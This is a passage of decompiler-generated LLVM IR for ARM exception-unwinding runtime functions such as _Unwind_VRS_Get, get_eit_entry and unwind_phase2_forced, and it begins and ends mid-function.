  %v4_16b5c = sext i16 %v3_16b5c to i32
  %v0_16b60 = load i32, i32* %r2.global-to-local, align 4
  %v1_16b60 = sub i32 0, %v0_16b60
  store i32 %v1_16b60, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_16b68 = add i32 %v4_16b5c, %v0_16b58
  %v4_16b68 = inttoptr i32 %v3_16b68 to i32*
  store i32 %v1_16b60, i32* %v4_16b68, align 4
  %v0_16b78.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16b78

dec_label_pc_16b70:                               ; preds = %entry
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_16b70 = icmp eq i32 %arg1, 0
  br i1 %v2_16b70, label %dec_label_pc_16b84, label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %dec_label_pc_16b70, %dec_label_pc_16b54
  %v0_16b78 = phi i32 [ %arg1, %dec_label_pc_16b70 ], [ %v0_16b78.pre, %dec_label_pc_16b54 ]
  %v3_16b7c = ashr i32 %v0_16b78, 31
  br label %dec_label_pc_16b88

dec_label_pc_16b84:                               ; preds = %dec_label_pc_16b70
  br label %dec_label_pc_16b88

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b78, %dec_label_pc_16b84
  %v1_16b90 = phi i32 [ %v0_16b78, %dec_label_pc_16b78 ], [ %tmp8, %dec_label_pc_16b84 ]
  %storemerge = phi i32 [ %v3_16b7c, %dec_label_pc_16b78 ], [ %tmp, %dec_label_pc_16b84 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  ret i32 %v1_16b90

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32 31, { 3, 1, 2, 4, 0 }
  uselistorder i16 8, { 3, 0, 1, 2, 4, 5 }
  uselistorder i16* @global_var_20d4c.598, { 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @__aeabi_read_tp, { 33, 66, 65, 32, 31, 28, 75, 74, 63, 64, 62, 61, 73, 72, 71, 70, 69, 68, 67, 30, 29, 60, 59, 58, 57, 53, 23, 22, 27, 56, 5, 12, 11, 10, 21, 20, 9, 3, 2, 52, 8, 7, 6, 51, 19, 18, 17, 14, 16, 15, 50, 49, 26, 25, 24, 37, 35, 48, 47, 46, 45, 34, 36, 44, 13, 4, 43, 42, 41, 40, 39, 38, 1, 0, 55, 54 }
  uselistorder i32 -4095, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_16b88, { 1, 0 }
}

define i32 @_Unwind_VRS_Get(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_16b98 = icmp eq i32 %regclass, 0
  br i1 %v2_16b98, label %dec_label_pc_16ba0, label %dec_label_pc_16bd0

dec_label_pc_16ba0:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16ba0
  %v6_16ba4 = icmp eq i32 %representation, 0
  br i1 %v6_16ba4, label %dec_label_pc_16bb4, label %bb8

.thread3:                                         ; preds = %dec_label_pc_16ba0
  br label %dec_label_pc_16bdc

bb8:                                              ; preds = %bb
  br label %dec_label_pc_16bdc

dec_label_pc_16bb4:                               ; preds = %bb
  %v3_16bb4 = mul i32 %regno, 4
  %v2_16bb8 = add i32 %v3_16bb4, %context
  %v1_16bbc = add i32 %v2_16bb8, 4
  %v2_16bbc = inttoptr i32 %v1_16bbc to i32*
  %v3_16bbc = load i32, i32* %v2_16bbc, align 4
  %v2_16bc8 = bitcast i8* %valuep to i32*
  store i32 %v3_16bbc, i32* %v2_16bc8, align 4
  ret i32 0

dec_label_pc_16bd0:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_16bd0
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_16bd0, %bb9
  %v0_16bd8 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_16bd8)
  br label %dec_label_pc_16bdc

dec_label_pc_16bdc:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_16bdc, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_VRS_Set(i32 %context, i32 %regclass, i32 %regno, i32 %representation, i8* %valuep) local_unnamed_addr {
entry:
  %v2_16be4 = icmp eq i32 %regclass, 0
  br i1 %v2_16be4, label %dec_label_pc_16bec, label %dec_label_pc_16c1c

dec_label_pc_16bec:                               ; preds = %entry
  %tmp = icmp ult i32 %regno, 16
  br i1 %tmp, label %bb, label %.thread3

bb:                                               ; preds = %dec_label_pc_16bec
  %v6_16bf0 = icmp eq i32 %representation, 0
  br i1 %v6_16bf0, label %dec_label_pc_16c00, label %bb8

.thread3:                                         ; preds = %dec_label_pc_16bec
  br label %dec_label_pc_16c28

bb8:                                              ; preds = %bb
  br label %dec_label_pc_16c28

dec_label_pc_16c00:                               ; preds = %bb
  %v3_16c04 = mul i32 %regno, 4
  %v1_16c08 = bitcast i8* %valuep to i32*
  %v2_16c08 = load i32, i32* %v1_16c08, align 4
  %v2_16c0c = add i32 %v3_16c04, %context
  %v2_16c14 = add i32 %v2_16c0c, 4
  %v3_16c14 = inttoptr i32 %v2_16c14 to i32*
  store i32 %v2_16c08, i32* %v3_16c14, align 4
  ret i32 0

dec_label_pc_16c1c:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_16c1c
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_16c1c, %bb9
  %v0_16c24 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_16c24)
  br label %dec_label_pc_16c28

dec_label_pc_16c28:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_16c28, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_16c30 = add i32 %context, 68
  %v2_16c30 = inttoptr i32 %v1_16c30 to i32*
  %v3_16c30 = load i32, i32* %v2_16c30, align 4
  ret i32 %v3_16c30

; uselistorder directives
  uselistorder i32 68, { 10, 0, 8, 1, 9, 2, 4, 5, 6, 3, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_16c40 = add i32 %exc, 8
  %v2_16c40 = inttoptr i32 %v1_16c40 to i32*
  %v3_16c40 = load i32, i32* %v2_16c40, align 4
  %v2_16c44 = icmp eq i32 %v3_16c40, 0
  br i1 %v2_16c44, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_16c58 = xor i1 %v2_16c44, true
  call void @__pseudo_cond_branch(i1 %v2_16c58, i32 %v3_16c40)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_16c70 = call i32 @abort()
  ret i32 %v0_16c70
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_16c7c = call i32 @abort()
  ret i32 %v0_16c7c
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_16c80 = load i32, i32* @r4, align 4
  store i32 %v3_16c80, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r5.global-to-local, align 4
  %v4_16c90 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 132) to i32*), align 4
  %v2_16c94 = icmp eq i32 %v4_16c90, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_16ca0 = add i32 %return_address, -2
  store i32 %v1_16ca0, i32* %r4.global-to-local, align 4
  br i1 %v2_16c94, label %dec_label_pc_16cd8, label %dec_label_pc_16ca8

dec_label_pc_16ca8:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_16c90)
  %v2_16cb8 = icmp eq i32 %v1_16ca0, 0
  br i1 %v2_16cb8, label %.thread, label %dec_label_pc_16cf8thread-pre-split

.thread:                                          ; preds = %dec_label_pc_16ca8
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_16cc0 = load i32, i32* %r6.global-to-local, align 4
  %v3_16cc0 = add i32 %v2_16cc0, 16
  %v4_16cc0 = inttoptr i32 %v3_16cc0 to i32*
  store i32 0, i32* %v4_16cc0, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16cc8:                               ; preds = %.thread, %.thread10, %dec_label_pc_16e70, %dec_label_pc_16e5c, %dec_label_pc_16e38, %dec_label_pc_16e10, %dec_label_pc_16d10
  %v0_16cc8 = load i32, i32* %r2.global-to-local, align 4
  %v2_16cd0 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_16cd0, i32* @r4, align 4
  ret i32 %v0_16cc8

dec_label_pc_16cd8:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_16ce0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 20) to i32*), align 4
  %v4_16ce4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 48) to i32*), align 4
  store i32 %v4_16ce4, i32* %r2.global-to-local, align 4
  %v2_16ce8 = sub i32 %v4_16ce0, %v4_16ce4
  %v3_16cec = sdiv i32 %v2_16ce8, 8
  store i32 %v3_16cec, i32* %stack_var_-36, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16cf8thread-pre-split:               ; preds = %dec_label_pc_16ca8
  %v3_16cf8.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_16cf8

dec_label_pc_16cf8:                               ; preds = %dec_label_pc_16cf8thread-pre-split, %dec_label_pc_16cd8
  %v0_16d3c.pre = phi i32 [ %v1_16ca0, %dec_label_pc_16cf8thread-pre-split ], [ %v4_16ce4, %dec_label_pc_16cd8 ]
  %v1_16d00 = phi i32 [ %v3_16cf8.pr, %dec_label_pc_16cf8thread-pre-split ], [ %v3_16cec, %dec_label_pc_16cd8 ]
  %v2_16cfc = icmp eq i32 %v1_16d00, 0
  br i1 %v2_16cfc, label %dec_label_pc_16d10, label %dec_label_pc_16d2c.preheader

dec_label_pc_16d2c.preheader:                     ; preds = %dec_label_pc_16cf8
  %v2_16d00 = add i32 %v1_16d00, -1
  %v1_16d5c = add i32 %v0_16d3c.pre, 8
  br label %dec_label_pc_16d2c.outer

dec_label_pc_16d10.loopexit:                      ; preds = %dec_label_pc_16d88
  br label %dec_label_pc_16d10

dec_label_pc_16d10:                               ; preds = %dec_label_pc_16d10.loopexit, %dec_label_pc_16cf8, %dec_label_pc_16e54
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_16d18 = load i32, i32* %r6.global-to-local, align 4
  %v2_16d18 = add i32 %v1_16d18, 16
  %v3_16d18 = inttoptr i32 %v2_16d18 to i32*
  store i32 0, i32* %v3_16d18, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16d20:                               ; preds = %dec_label_pc_16d7c
  %v3_16d20 = icmp ult i32 %storemerge40, %v0_16d80
  br i1 %v3_16d20, label %dec_label_pc_16d28, label %dec_label_pc_16d98

dec_label_pc_16d28:                               ; preds = %dec_label_pc_16d20
  %v1_16d28 = add nsw i32 %v3_16d34, 1
  br label %dec_label_pc_16d2c.outer

dec_label_pc_16d2c.outer:                         ; preds = %dec_label_pc_16d28, %dec_label_pc_16d2c.preheader
  %v1_16d88.ph = phi i32 [ %v1_16d28, %dec_label_pc_16d28 ], [ 0, %dec_label_pc_16d2c.preheader ]
  %v0_16d2c.ph = phi i32 [ %v0_16d2c, %dec_label_pc_16d28 ], [ %v2_16d00, %dec_label_pc_16d2c.preheader ]
  br label %dec_label_pc_16d2c

dec_label_pc_16d2c:                               ; preds = %dec_label_pc_16d2c.outer, %dec_label_pc_16d90
  %v0_16d2c = phi i32 [ %v1_16d90, %dec_label_pc_16d90 ], [ %v0_16d2c.ph, %dec_label_pc_16d2c.outer ]
  %v2_16d2c = add i32 %v0_16d2c, %v1_16d88.ph
  %tmp = icmp slt i32 %v2_16d2c, 0
  %v4_16d30 = zext i1 %tmp to i32
  %v5_16d30 = add i32 %v4_16d30, %v2_16d2c
  %v3_16d34 = sdiv i32 %v5_16d30, 2
  %v3_16d38 = mul i32 %v3_16d34, 8
  store i32 %v3_16d38, i32* @ip, align 4
  %v2_16d3c = add i32 %v3_16d38, %v0_16d3c.pre
  %v3_16d3c = inttoptr i32 %v2_16d3c to i32*
  %v4_16d3c = load i32, i32* %v3_16d3c, align 4
  %v1_16d40 = and i32 %v4_16d3c, 1073741824
  %v2_16d40 = icmp eq i32 %v1_16d40, 0
  %v2_16d44 = or i32 %v4_16d3c, -2147483648
  %tmp79 = bitcast i32 %v4_16d3c to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_16d48 = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_16d40, i32 %v2_16d48, i32 %v2_16d44
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_16d4c = icmp eq i32 %v2_16d00, %v3_16d34
  store i32 %v2_16d3c, i32* %r7.global-to-local, align 4
  br i1 %v9_16d4c, label %dec_label_pc_16d7c, label %dec_label_pc_16d5c

dec_label_pc_16d5c:                               ; preds = %dec_label_pc_16d2c
  %v2_16d60 = add i32 %v3_16d38, %v1_16d5c
  %v3_16d60 = inttoptr i32 %v2_16d60 to i32*
  %v4_16d60 = load i32, i32* %v3_16d60, align 4
  %v1_16d68 = and i32 %v4_16d60, 1073741824
  %v2_16d68 = icmp eq i32 %v1_16d68, 0
  %v2_16d6c = or i32 %v4_16d60, -2147483648
  %tmp81 = bitcast i32 %v4_16d60 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_16d70 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_16d68, i32 %v2_16d70, i32 %v2_16d6c
  %v1_16d74 = add i32 %v2_16d60, -1
  %v2_16d78 = add i32 %storemerge39, %v1_16d74
  br label %dec_label_pc_16d7c

dec_label_pc_16d7c:                               ; preds = %dec_label_pc_16d2c, %dec_label_pc_16d5c
  %storemerge40 = phi i32 [ %v2_16d78, %dec_label_pc_16d5c ], [ -1, %dec_label_pc_16d2c ]
  %v2_16d7c = add i32 %storemerge, %v2_16d3c
  %v0_16d80 = load i32, i32* %r4.global-to-local, align 4
  %v3_16d80 = icmp ult i32 %v0_16d80, %v2_16d7c
  br i1 %v3_16d80, label %dec_label_pc_16d88, label %dec_label_pc_16d20

dec_label_pc_16d88:                               ; preds = %dec_label_pc_16d7c
  %v9_16d88 = icmp eq i32 %v3_16d34, %v1_16d88.ph
  br i1 %v9_16d88, label %dec_label_pc_16d10.loopexit, label %dec_label_pc_16d90

dec_label_pc_16d90:                               ; preds = %dec_label_pc_16d88
  %v1_16d90 = add nsw i32 %v3_16d34, -1
  br label %dec_label_pc_16d2c

dec_label_pc_16d98:                               ; preds = %dec_label_pc_16d20
  %v2_16d98 = load i32, i32* %v3_16d3c, align 4
  %v1_16d9c = and i32 %v2_16d98, 1073741824
  %v2_16d9c = icmp eq i32 %v1_16d9c, 0
  %v2_16da0 = or i32 %v2_16d98, -2147483648
  %tmp83 = bitcast i32 %v2_16d98 to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_16da4 = bitcast float %tmp84 to i32
  %v0_16da8 = select i1 %v2_16d9c, i32 %v2_16da4, i32 %v2_16da0
  %v2_16da8 = add i32 %v0_16da8, %v2_16d3c
  %v1_16dac = load i32, i32* %r6.global-to-local, align 4
  %v2_16dac = add i32 %v1_16dac, 72
  %v3_16dac = inttoptr i32 %v2_16dac to i32*
  store i32 %v2_16da8, i32* %v3_16dac, align 4
  %v0_16db0 = load i32, i32* %r7.global-to-local, align 4
  %v1_16db0 = add i32 %v0_16db0, 4
  %v2_16db0 = inttoptr i32 %v1_16db0 to i32*
  %v3_16db0 = load i32, i32* %v2_16db0, align 4
  %v7_16db4 = icmp eq i32 %v3_16db0, 1
  br i1 %v7_16db4, label %.thread10, label %dec_label_pc_16dc8

.thread10:                                        ; preds = %dec_label_pc_16d98
  %v1_16db4 = add i32 %v3_16db0, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_16dc0 = load i32, i32* %r6.global-to-local, align 4
  %v3_16dc0 = add i32 %v2_16dc0, 16
  %v4_16dc0 = inttoptr i32 %v3_16dc0 to i32*
  store i32 %v1_16db4, i32* %v4_16dc0, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16dc8:                               ; preds = %dec_label_pc_16d98
  %v1_16dc8 = icmp slt i32 %v3_16db0, 0
  br i1 %v1_16dc8, label %.thread38, label %dec_label_pc_16de0

.thread38:                                        ; preds = %dec_label_pc_16dc8
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_16dd4 = load i32, i32* %r6.global-to-local, align 4
  %v5_16dd4 = add i32 %v4_16dd4, 76
  %v6_16dd4 = inttoptr i32 %v5_16dd4 to i32*
  store i32 %v1_16db0, i32* %v6_16dd4, align 4
  %v3_16dd8 = load i32, i32* %r2.global-to-local, align 4
  %v4_16dd8 = load i32, i32* %r6.global-to-local, align 4
  %v5_16dd8 = add i32 %v4_16dd8, 80
  %v6_16dd8 = inttoptr i32 %v5_16dd8 to i32*
  store i32 %v3_16dd8, i32* %v6_16dd8, align 4
  br label %dec_label_pc_16e00

dec_label_pc_16de0:                               ; preds = %dec_label_pc_16dc8
  %v1_16de0 = and i32 %v3_16db0, 1073741824
  %v2_16de0 = icmp eq i32 %v1_16de0, 0
  %v2_16de4 = or i32 %v3_16db0, -2147483648
  %tmp85 = bitcast i32 %v3_16db0 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_16de8 = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_16de0, i32 %v2_16de8, i32 %v2_16de4
  %v1_16dec = add i32 %storemerge42, 4
  %v2_16df0 = add i32 %v1_16dec, %v0_16db0
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_16df8 = load i32, i32* %r6.global-to-local, align 4
  %v2_16df8 = add i32 %v1_16df8, 76
  %v3_16df8 = inttoptr i32 %v2_16df8 to i32*
  store i32 %v2_16df0, i32* %v3_16df8, align 4
  %v0_16dfc = load i32, i32* %r2.global-to-local, align 4
  %v1_16dfc = load i32, i32* %r6.global-to-local, align 4
  %v2_16dfc = add i32 %v1_16dfc, 80
  %v3_16dfc = inttoptr i32 %v2_16dfc to i32*
  store i32 %v0_16dfc, i32* %v3_16dfc, align 4
  br label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %.thread38, %dec_label_pc_16de0
  %v0_16e00 = load i32, i32* %r6.global-to-local, align 4
  %v1_16e00 = add i32 %v0_16e00, 76
  %v2_16e00 = inttoptr i32 %v1_16e00 to i32*
  %v3_16e00 = load i32, i32* %v2_16e00, align 4
  store i32 %v3_16e00, i32* %r2.global-to-local, align 4
  %v1_16e04 = inttoptr i32 %v3_16e00 to i32*
  %v2_16e04 = load i32, i32* %v1_16e04, align 4
  %v1_16e08 = icmp slt i32 %v2_16e04, 0
  br i1 %v1_16e08, label %dec_label_pc_16e2c, label %dec_label_pc_16e10

dec_label_pc_16e10:                               ; preds = %dec_label_pc_16e00
  %v1_16e10 = and i32 %v2_16e04, 1073741824
  %v2_16e10 = icmp eq i32 %v1_16e10, 0
  %v2_16e14 = or i32 %v2_16e04, -2147483648
  %tmp87 = bitcast i32 %v2_16e04 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_16e18 = bitcast float %tmp88 to i32
  %v0_16e1c = select i1 %v2_16e10, i32 %v2_16e18, i32 %v2_16e14
  %v2_16e1c = add i32 %v0_16e1c, %v3_16e00
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_16e24 = add i32 %v0_16e00, 16
  %v3_16e24 = inttoptr i32 %v2_16e24 to i32*
  store i32 %v2_16e1c, i32* %v3_16e24, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e00
  %v3_16e2c = udiv i32 %v2_16e04, 16777216
  %v1_16e30 = urem i32 %v3_16e2c, 16
  %v2_16e30 = icmp eq i32 %v1_16e30, 0
  br i1 %v2_16e30, label %dec_label_pc_16e38, label %dec_label_pc_16e4c

dec_label_pc_16e38:                               ; preds = %dec_label_pc_16e2c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16e40 = load i32, i32* %r5.global-to-local, align 4
  %v2_16e40 = add i32 %v0_16e40, -38056
  %v2_16e44 = add i32 %v0_16e00, 16
  %v3_16e44 = inttoptr i32 %v2_16e44 to i32*
  store i32 %v2_16e40, i32* %v3_16e44, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16e4c:                               ; preds = %dec_label_pc_16e2c
  %v7_16e4c = icmp eq i32 %v1_16e30, 1
  br i1 %v7_16e4c, label %dec_label_pc_16e70, label %dec_label_pc_16e54

dec_label_pc_16e54:                               ; preds = %dec_label_pc_16e4c
  %v7_16e54 = icmp eq i32 %v1_16e30, 2
  br i1 %v7_16e54, label %dec_label_pc_16e5c, label %dec_label_pc_16d10

dec_label_pc_16e5c:                               ; preds = %dec_label_pc_16e54
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16e64 = load i32, i32* %r5.global-to-local, align 4
  %v2_16e64 = add i32 %v0_16e64, -38072
  %v2_16e68 = add i32 %v0_16e00, 16
  %v3_16e68 = inttoptr i32 %v2_16e68 to i32*
  store i32 %v2_16e64, i32* %v3_16e68, align 4
  br label %dec_label_pc_16cc8

dec_label_pc_16e70:                               ; preds = %dec_label_pc_16e4c
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_16e78 = load i32, i32* %r5.global-to-local, align 4
  %v2_16e78 = add i32 %v0_16e78, -38064
  %v2_16e7c = add i32 %v0_16e00, 16
  %v3_16e7c = inttoptr i32 %v2_16e7c to i32*
  store i32 %v2_16e78, i32* %v3_16e7c, align 4
  br label %dec_label_pc_16cc8

; uselistorder directives
  uselistorder i32 %v1_16e30, { 2, 1, 0 }
  uselistorder i32 %v0_16e00, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_16db0, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_16d80, { 1, 0 }
  uselistorder i32 %v3_16d38, { 2, 1, 0 }
  uselistorder i32 %v3_16d34, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_16d2c, { 1, 0 }
  uselistorder i32 %v0_16d2c, { 1, 0 }
  uselistorder i32 %v2_16d00, { 1, 0 }
  uselistorder i32 %v0_16d3c.pre, { 1, 0 }
  uselistorder i32 %v3_16cec, { 1, 0 }
  uselistorder i32 %v1_16ca0, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_16e00, { 1, 0 }
  uselistorder label %dec_label_pc_16d7c, { 1, 0 }
  uselistorder label %dec_label_pc_16d2c, { 1, 0 }
  uselistorder label %dec_label_pc_16d10, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16cc8, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_16e88(i32 %arg1) local_unnamed_addr {
dec_label_pc_16e88:
  %v0_16e88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16e88, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_16e88
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_16e88, %bb
  %v10_16e90 = phi i32 [ %arg1, %dec_label_pc_16e88 ], [ 0, %bb ]
  ret i32 %v10_16e90

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_16ea4 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_16eb8 = inttoptr i32 %v1_16ea4 to i32*
  %v2_16eb8 = load i32, i32* %v1_16eb8, align 4
  store i32 %v2_16eb8, i32* %r0.global-to-local, align 4
  %v12_16eb8 = add i32 %entry_vrs, 20
  %v1_16ec4 = inttoptr i32 %v12_16eb8 to i32*
  %v2_16ec4 = load i32, i32* %v1_16ec4, align 4
  store i32 %v2_16ec4, i32* %r0.global-to-local, align 4
  %v12_16ec4 = add i32 %entry_vrs, 36
  %v1_16ecc = inttoptr i32 %v12_16ec4 to i32*
  %v2_16ecc = load i32, i32* %v1_16ecc, align 4
  store i32 %v2_16ecc, i32* %r0.global-to-local, align 4
  %v12_16ecc = add i32 %entry_vrs, 52
  store i32 %v12_16ecc, i32* @ip, align 4
  %v13_16ed0 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_16ed0, i32* @lr, align 4
  %v1_16ed4 = inttoptr i32 %v12_16ecc to i32*
  %v2_16ed4 = load i32, i32* %v1_16ed4, align 4
  store i32 %v2_16ed4, i32* %r0.global-to-local, align 4
  %v9_16ed4 = add i32 %entry_vrs, 64
  %v10_16ed4 = inttoptr i32 %v9_16ed4 to i32*
  %v11_16ed4 = load i32, i32* %v10_16ed4, align 4
  store i32 0, i32* @r4, align 4
  %v1_16edc = add i32 %ucbp, 12
  %v2_16edc = inttoptr i32 %v1_16edc to i32*
  %v3_16edc = load i32, i32* %v2_16edc, align 4
  store i32 %v2_16ed4, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_16ef4 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_16ed4)
  store i32 %v2_16ef4, i32* %r0.global-to-local, align 4
  %v0_16ef8 = load i32, i32* @r6, align 4
  %v1_16ef8 = load i32, i32* @r4, align 4
  %v9_16ef8 = icmp eq i32 %v0_16ef8, %v1_16ef8
  store i32 %v2_16ef4, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_16ef8, label %dec_label_pc_16f0c, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_16f18

dec_label_pc_16f0c:                               ; preds = %entry
  store i32 %v0_16ef8, i32* @r4, align 4
  br label %dec_label_pc_16f14

dec_label_pc_16f14:                               ; preds = %dec_label_pc_16fdc, %dec_label_pc_16f0c
  br label %dec_label_pc_16f18

dec_label_pc_16f18:                               ; preds = %.thread, %dec_label_pc_16f14
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_16f14 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_16f18 = icmp eq i32 %v2_16ef4, 0
  br i1 %v2_16f18, label %dec_label_pc_16f90, label %.thread2.dec_label_pc_16f2c_crit_edge

.thread2.dec_label_pc_16f2c_crit_edge:            ; preds = %dec_label_pc_16f18
  br label %dec_label_pc_16f2c

dec_label_pc_16f2c:                               ; preds = %.thread2.dec_label_pc_16f2c_crit_edge, %dec_label_pc_16f90
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_16f3c = load i32, i32* @r5, align 4
  store i32 %v0_16f3c, i32* @r3, align 4
  store i32 94028, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_16edc)
  br i1 false, label %dec_label_pc_16f54, label %dec_label_pc_16f7c

dec_label_pc_16f54:                               ; preds = %dec_label_pc_16f2c
  br i1 undef, label %dec_label_pc_16f5c, label %dec_label_pc_16f80

dec_label_pc_16f5c:                               ; preds = %dec_label_pc_16f54
  br i1 undef, label %dec_label_pc_16fdc, label %dec_label_pc_16f74

dec_label_pc_16f74:                               ; preds = %dec_label_pc_16f5c
  br i1 undef, label %dec_label_pc_16fd4, label %dec_label_pc_16f7c

dec_label_pc_16f7c:                               ; preds = %dec_label_pc_16f2c, %dec_label_pc_16f74
  br label %dec_label_pc_16f80

dec_label_pc_16f80:                               ; preds = %dec_label_pc_16f54, %dec_label_pc_16f7c
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

